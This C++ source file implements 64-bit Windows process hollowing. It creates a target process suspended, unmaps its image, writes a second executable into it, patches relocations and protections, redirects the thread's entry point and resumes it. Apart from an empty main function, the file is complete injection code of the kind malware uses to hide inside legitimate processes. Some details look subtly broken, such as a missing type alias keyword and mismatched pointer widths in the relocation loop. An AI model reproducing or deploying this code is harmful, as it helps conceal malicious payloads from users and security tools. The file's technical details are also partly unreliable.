#include <Windows.h>
#include <string>
#include <vector>
#include <fstream>

int wmain(int argc, wchar_t* argv[]) {
	// left purposefully blank so this can't be used off the shelf
}

// 64 bit process hollowing
int ProcessHollowing(std::wstring targetPath, std::wstring sourcePath) {
    
    // open the target image
    std::vector<std::byte> targetContent = readFile(targetPath);
    if (targetContent.empty()) {
        return 1;
    }

    // locate headers of target image
    PIMAGE_DOS_HEADER pTargetDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(targetContent.data());
    PIMAGE_NT_HEADERS pTargetNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<uintptr_t>(pTargetDOSHeader) + pTargetDOSHeader->e_lfanew);

    // check if target PE is valid
    if (!(pTargetNTHeaders->Signature == IMAGE_NT_SIGNATURE)) {
        return 2;
    }

    // check if target PE is 64 bit
    if (!(pTargetNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)) {
        return 3;
    }

    // open the source image
    std::vector<std::byte> sourceContent = readFile(sourcePath);
    if (sourceContent.empty()) {
        return 4;
    }

    // locate headers of source image
    PIMAGE_DOS_HEADER pSourceDOSHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(sourceContent.data());
    PIMAGE_NT_HEADERS pSourceNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<uintptr_t>(pSourceDOSHeader) + pSourceDOSHeader->e_lfanew);

    // check if source PE is valid
    if (!(pSourceNTHeaders->Signature == IMAGE_NT_SIGNATURE)) {
        return 5;
    }
    
    // check if source PE is 64 bit
    if (!(pSourceNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC)) {
        return 6;
    }

    // ensure source is smaller than target
    if (sourceContent.size() > targetContent.size()) {
        return 7;
    }

    // ensure source and target use same subsystem
    if (pTargetNTHeaders->OptionalHeader.Subsystem != pSourceNTHeaders->OptionalHeader.Subsystem) {
        return 8;
    }

    // setup target process structs
    STARTUPINFOW targetSI;
    PROCESS_INFORMATION targetPI;
    ZeroMemory(&targetSI, sizeof(targetSI));
    targetSI.cb = sizeof(targetSI);
    ZeroMemory(&targetPI, sizeof(targetPI));

    // create the target process in a suspended state
    if (!CreateProcessW(
        targetPath.c_str(),
        NULL,
        NULL,
        NULL,
        false,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &targetSI,
        &targetPI
    )) {
        return 9;
    }

    // get the target thread context for the image base address and for later
    CONTEXT context = {};
    context.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(targetPI.hThread, &context)) {
        return 10;
    }

    // get the base address for the target image
    LPVOID lpImageBaseAddress = nullptr;
    if (!ReadProcessMemory(
        targetPI.hProcess,
        reinterpret_cast<LPVOID>(context.Rdx + 0x10),
        &lpImageBaseAddress,
        sizeof(UINT64),
        nullptr
    )) {
        return 11;
    }

    // get pointer to NtUnmapViewOfSection
    HMODULE hNTDLL = GetModuleHandleW(L"ntdll.dll");
    if (!hNTDLL) {
        return 12;
    }
    NtUnmapViewOfSectionPtr = NTSTATUS(NTAPI*)(HANDLE processHandle, PVOID baseAddress);
    const auto NtUnmapViewOfSection = reinterpret_cast<NtUnmapViewOfSectionPtr>(GetProcAddress(hNTDLL, "NtUnmapViewOfSection"));

    // unmap target image
    NTSTATUS status = NtUnmapViewOfSection(targetPI.hProcess, lpImageBaseAddress);
    if (status) {
        return 13;
    }

    // allocate memory to write source image
    PVOID allocatedMem = VirtualAllocEx(
        targetPI.hProcess,
        lpImageBaseAddress,
        pSourceNTHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (allocatedMem == NULL) {
        return 14;
    }

    // the difference between the where the source image starts in target memory and the image base member in the nt header
    ptrdiff_t delta = reinterpret_cast<uintptr_t>(allocatedMem) - pSourceNTHeaders->OptionalHeader.ImageBase;

    // set the preferred image base to where we ended up in target memory
    pSourceNTHeaders->OptionalHeader.ImageBase = reinterpret_cast<uintptr_t>(allocatedMem);

    // write source image headers to target memory
    if (!WriteProcessMemory(
        targetPI.hProcess,
        lpImageBaseAddress,
        sourceContent.data(),
        pSourceNTHeaders->OptionalHeader.SizeOfHeaders,
        NULL
    )) {
        return 15;
    }

    // write source image sections to target memory
    PIMAGE_SECTION_HEADER pImageRelocSection;
    for (int i = 0; i < pSourceNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(
            (reinterpret_cast<uintptr_t>(pSourceNTHeaders) + 4 + sizeof(IMAGE_FILE_HEADER)) +
            pSourceNTHeaders->FileHeader.SizeOfOptionalHeader +
            (i * sizeof(IMAGE_SECTION_HEADER))
            );

        if (strcmp(".reloc", reinterpret_cast<LPSTR>(pSectionHeader->Name)) == 0) {
            pImageRelocSection = pSectionHeader;
        }

        LPVOID virtualAddress = reinterpret_cast<LPVOID>(reinterpret_cast<UINT64>(allocatedMem) + pSectionHeader->VirtualAddress);
        LPVOID pointerToRawData = reinterpret_cast<LPVOID>(reinterpret_cast<UINT64>(sourceContent.data()) + pSectionHeader->PointerToRawData);

        if (!WriteProcessMemory(
            targetPI.hProcess,
            virtualAddress,
            pointerToRawData,
            pSectionHeader->SizeOfRawData,
            NULL
        )) {
            return 16;
        }
    }

    // process relocations 
    // the base address in the target process where the source image starts
    uintptr_t base = reinterpret_cast<uintptr_t>(pSourceDOSHeader);
    // pointer to the start of the relocations section in the source image
    auto reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(base + pImageRelocSection->PointerToRawData);

    // while there are blocks in the relocations section to process
    while (reloc->VirtualAddress) {
        // ensure that the size of the block is not 0, size of 0 defines the end of the block
        if (reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
            // calculate the number of entries in this block
            int count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(unsigned short);
            // create an array representing the entries in this block
            auto list = reinterpret_cast<unsigned short*>(reloc + 1);

            // loop through the entries in this block
            for (int i = 0; i < count; i++) {
                if (list[i]) {
                    // create a pointer to the entry's address that contains an address that needs to be changed
                    auto ptr = reinterpret_cast<unsigned long*>(
                        reinterpret_cast<uintptr_t>(allocatedMem) +
                        (static_cast<unsigned long long>(reloc->VirtualAddress) + (list[i] & 0xFFF)));

                    DWORD64 PatchedAddress = 0;

                    if (!ReadProcessMemory(
                        targetPI.hProcess,
                        reinterpret_cast<LPVOID>(ptr),
                        &PatchedAddress,
                        sizeof(DWORD64),
                        NULL
                    )) {
                        return 17;
                    }

                    PatchedAddress += delta;

                    if (!WriteProcessMemory(
                        targetPI.hProcess,
                        reinterpret_cast<LPVOID>(ptr),
                        &PatchedAddress,
                        sizeof(DWORD64),
                        NULL
                    )) {
                        return 18;
                    }
                }
            }
        }

        // find the starting address of the next relocation block
        reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(reinterpret_cast<LPBYTE>(reloc) + reloc->SizeOfBlock);
    }

    // fix source pe header's memory protections
    DWORD _oldPermissions;
    if (!VirtualProtectEx(
        targetPI.hProcess,
        lpImageBaseAddress,
        pSourceNTHeaders->OptionalHeader.SizeOfHeaders,
        PAGE_READONLY,
        &_oldPermissions
    )) {
        return 19;
    }

    // fix source section memory protections
    for (int i = 0; i < pSourceNTHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSectionHeader = reinterpret_cast<PIMAGE_SECTION_HEADER>(
            (reinterpret_cast<uintptr_t>(pSourceNTHeaders) + 4 + sizeof(IMAGE_FILE_HEADER)) +
            pSourceNTHeaders->FileHeader.SizeOfOptionalHeader +
            (i * sizeof(IMAGE_SECTION_HEADER))
            );
        DWORD protect, executable, readable, writeable;

        // determine protection flags based on characteristics
        executable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        readable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
        writeable = (pSectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

        if (!executable && !readable && !writeable)
            protect = PAGE_NOACCESS;
        else if (!executable && !readable && writeable)
            protect = PAGE_WRITECOPY;
        else if (!executable && readable && !writeable)
            protect = PAGE_READONLY;
        else if (!executable && readable && writeable)
            protect = PAGE_READWRITE;
        else if (executable && !readable && !writeable)
            protect = PAGE_EXECUTE;
        else if (executable && !readable && writeable)
            protect = PAGE_EXECUTE_WRITECOPY;
        else if (executable && readable && !writeable)
            protect = PAGE_EXECUTE_READ;
        else if (executable && readable && writeable)
            protect = PAGE_EXECUTE_READWRITE;

        if (pSectionHeader->Characteristics & IMAGE_SCN_MEM_NOT_CACHED) {
            protect |= PAGE_NOCACHE;
        }

        LPVOID virtualAddress = reinterpret_cast<LPVOID>(reinterpret_cast<UINT64>(allocatedMem) + pSectionHeader->VirtualAddress);
        DWORD size = pSectionHeader->Misc.VirtualSize;

        if (!VirtualProtectEx(
            targetPI.hProcess,
            virtualAddress,
            size,
            protect,
            &_oldPermissions
        )) {
            return 20;
        }
    }

    // change entry point rcx
    context.Rcx = reinterpret_cast<DWORD64>(reinterpret_cast<LPBYTE>(allocatedMem) + pSourceNTHeaders->OptionalHeader.AddressOfEntryPoint);

    // apply the new entry point and start the thread
    if (!SetThreadContext(targetPI.hThread, &context)) {
        return 21;
    }

    if (ResumeThread(targetPI.hThread) == -1) {
        return 22;
    }

    return 0;
}

// Read a file from disk into buffer
std::vector<std::byte> readFile(std::wstring path) {
    std::ifstream file{ path, std::ios::in | std::ios::binary };
    if (file.fail()) {
        return {};
    }

    file.seekg(0, std::ios::end);
    auto size = static_cast<size_t>(file.tellg());

    file.seekg(0, std::ios::beg);
    std::vector<std::byte> buffer{ size };

    file.read(reinterpret_cast<char*>(buffer.data()), size);

    file.close();
    return buffer;
}